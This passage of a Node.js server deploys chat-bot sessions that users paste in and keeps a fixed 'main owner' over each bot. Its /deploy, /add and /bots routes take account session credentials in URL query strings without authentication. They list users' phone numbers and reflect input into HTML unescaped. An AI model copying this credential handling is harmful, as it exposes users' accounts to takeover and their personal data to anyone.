    if(data && data.session){ res.json({ session: data.session, number: num }); }
    else{ res.json({ waiting: true }); }
});

app.get("/deploy", async(req,res)=>{
    const session=req.query.session||"";
    const days=req.query.days||"30";
    if(session){
        try{
            const b64=session.includes("~")? session.split("~").pop() : session;
            const json=JSON.parse(Buffer.from(b64.trim(),"base64").toString("utf8"));
            const userId=normalizeNumber(json?.me?.id)||`user_${Date.now()}`;
            const daysNum=parseInt(days)||30;
            if(activeBots.has(userId)) return res.send(`Bot ${userId} already active - <a href=/>Home</a>`);
            saveMultiSession(userId, session, daysNum);
            await startBotForUser(userId, session);
            return res.send(`<body style="background:#080808;color:#fff;font-family:Arial;text-align:center;padding:30px"><h1 style="color:#00ff88">✅ Bot ${userId} deployed for ${daysNum} days</h1><p>Owner: ${MAIN_OWNER}</p><a href="/" style="display:block;padding:15px;background:#00ff88;color:#000;text-decoration:none;border-radius:10px;max-width:300px;margin:20px auto">Home</a></body>`);
        }catch(e){ return res.send(`❌ Failed: ${e.message} - <a href=/deploy>Try again</a>`); }
    }
    res.send(`
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Deploy Bot</title>
<style>body{background:#080808;color:#fff;font-family:Arial;text-align:center;padding:20px;}.card{max-width:600px;margin:auto;background:#151515;padding:25px;border-radius:18px;} input,select{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;background:#222;color:#fff;}.btn{width:100%;padding:15px;background:#00ff88;color:#000;border:none;border-radius:10px;font-weight:bold;cursor:pointer;} textarea{width:100%;height:150px;padding:12px;background:#222;color:#fff;border:none;border-radius:8px;} </style>
</head><body><div class="card">
<h1 style="color:#00ff88">🚀 DEPLOY SESSION</h1>
<p>Main Owner: ${MAIN_OWNER} (always owner)</p>
<form method="GET" action="/deploy">
<label>Session ID (ETIAS-MINI-BOT~...)</label>
<textarea name="session" placeholder="ETIAS-MINI-BOT~...." required></textarea>
<label>Days until expire</label>
<select name="days"><option value="7">7 days</option><option value="15">15 days</option><option value="30" selected>30 days</option><option value="60">60 days</option><option value="90">90 days</option><option value="365">365 days (1 year)</option></select>
<button class="btn" type="submit">DEPLOY BOT</button>
</form>
<p style="color:#888;font-size:12px;margin-top:20px">Users pair at /pair, copy session, send to you, you deploy here with days</p>
<a href="/" style="color:#00ff88">← Home</a>
</div></body></html>
`);
});

app.get("/add", async(req,res)=>{
    const session=req.query.session; const days=parseInt(req.query.days)||30;
    if(!session) return res.send(`Use /deploy?session=ETIAS~xxx&days=30 or /pair to generate session`);
    try{
        const b64=session.includes("~")? session.split("~").pop() : session;
        const json=JSON.parse(Buffer.from(b64.trim(),"base64").toString("utf8"));
        const userId=normalizeNumber(json?.me?.id)||`user_${Date.now()}`;
        if(activeBots.has(userId)) return res.send(`Bot ${userId} already active`);
        saveMultiSession(userId, session, days); await startBotForUser(userId, session); res.send(`✅ Bot ${userId} started for ${days} days`);
    }catch(e){ res.send(`❌ Failed: ${e.message}`); }
});

app.get("/bots", async(req,res)=>{
    const bots=Array.from(activeBots.keys());
    let mongoData=[];
    if(mongoose.connection.readyState===1){
        const docs=await SessionModel.find({});
        mongoData=docs.map(d=>({ userId:d.userId, phone:d.phone, days:d.days, expiresAt:d.expiresAt, remaining: d.expiresAt? Math.ceil((new Date(d.expiresAt).getTime()-Date.now())/(24*60*60*1000)) : 0, connected: activeBots.has(d.userId) }));
    }
    res.json({ mainOwner: MAIN_OWNER, active: bots.length, bots, sessions: mongoData, mode: global.botMode });
});

const PORT=process.env.PORT||3000;
app.listen(PORT, ()=> console.log(`[SERVER] ${PORT} - Main Owner ${MAIN_OWNER} - /pair to get session, /deploy to add`));
startAll();
